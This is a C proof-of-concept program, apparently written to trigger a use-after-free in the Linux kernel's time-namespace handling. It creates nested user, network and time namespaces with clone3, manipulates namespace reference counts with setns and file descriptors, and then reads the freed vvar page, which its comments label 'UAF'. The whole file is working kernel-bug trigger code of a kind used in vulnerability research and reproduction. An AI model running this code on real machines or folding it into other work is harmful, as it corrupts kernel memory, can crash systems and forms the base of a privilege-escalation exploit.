#define _GNU_SOURCE
#include <sched.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <linux/sched.h>

struct timespec req_1sec = { .tv_sec=1 };
struct timespec req_5sec = { .tv_sec=5 };
unsigned long vvar;

long clone3(struct clone_args *cl_args, size_t size) {
    return syscall(SYS_clone3, cl_args, size);
}

unsigned long get_vvar_base_address() {
    FILE *fp = fopen("/proc/self/maps", "r");
    char line[256];
    unsigned long vvar_base = 0;

    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, "vvar")) {
            unsigned long start, end;
            if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
                vvar_base = start;
                break;
            }
        }
    }

    fclose(fp);
    return vvar_base;
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp, ret;
    char edit[0x100];
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}

int main() {
    int ns_fdA;
    int ns_fdB;
    int ret;
    struct clone_args cl_args = {};
    char ns_path[256];
    pid_t pid;
    pid_t old_uid, old_gid;

    vvar = get_vvar_base_address();
    printf("vvar: 0x%016lx\n", vvar);


    // ======== create thread-A ========
    old_uid = getuid();
    old_gid = getgid();
    cl_args.flags = CLONE_NEWTIME | CLONE_NEWUSER | CLONE_NEWNET;
    pid = clone3(&cl_args, sizeof(cl_args));
    if (pid != 0) while (1);
    unshare_setup(old_uid, old_gid);
    // === [now] ===
    // time == time_for_children == tns-A, refcount = 2

    snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/time", getpid());
    ns_fdA = open(ns_path, O_RDONLY);
    // === [now] ===
    // tns-A refcount++, refcount = 3


    // ======== create thread-B (io worker) ========
    cl_args.flags = CLONE_VM | CLONE_NEWTIME;
    register int pidB = clone3(&cl_args, sizeof(cl_args));
    // === [now] ===
    // time == tns-A, refcount = 4
    // time_for_children == tns-B (new), refcount = 1

    if (pidB != 0) {
        pid = pidB;
        asm volatile(
            ".intel_syntax noprefix;"
            "lea rdi, [%0];"
            "xor rsi, rsi;"
            "mov rax, 35;"
            "syscall;"
            ".att_syntax;"
            :: "r"(&req_1sec)
        );
        snprintf(ns_path, sizeof(ns_path), "/proc/%d/ns/time_for_children", pid);
        ns_fdB = open(ns_path, O_RDONLY);
        setns(ns_fdB, CLONE_NEWTIME);
        close(ns_fdB);

        // === [now] ===
        // time == time_for_children == tns-B, refcount = 3
        // tns-A, refcount = 2

        sleep(7); // <-------------------------------------------
                                                               // |
        close(ns_fdA);                                         // |
        // === [now] ===                                       // |
        // tns-A refcount --, refcount = 0 and free vvar page  // |
                                                               // |
        printf("%d\n", *(int *)vvar);// UAF                    // |
        while (1);                                             // |
    } else {                                                   // |
        asm volatile(                                          // |
            ".intel_syntax noprefix;"                          // |
            "lea rdi, [%0];"                                   // |
            "xor rsi, rsi;"                                    // |
            "mov rax, 35;"                                     // |
            "syscall;"                                         // |
            ".att_syntax;"                                     // |
            :: "r"(&req_5sec)                                  // |
        );                                                     // |
        asm volatile(                                          // |
            ".intel_syntax noprefix;"                          // |
            "mov rsi, qword ptr [%0];"                         // |
            // === [now] ===                                   // |
            // tns-A's vvar is mapped                          // |
            "mov rax, 60;"                                     // |
            "syscall;"                                         // |
            ".att_syntax;"                                     // |
            :: "r"(vvar)                                       // |
        );                                                     // |
        // === [now] ===   ---------------------------------------  (finished)
        // (time) tns-A refcount --, refcount = 1
        // (time_for_children) tns-B refcount --, refcount = 2
    }
}
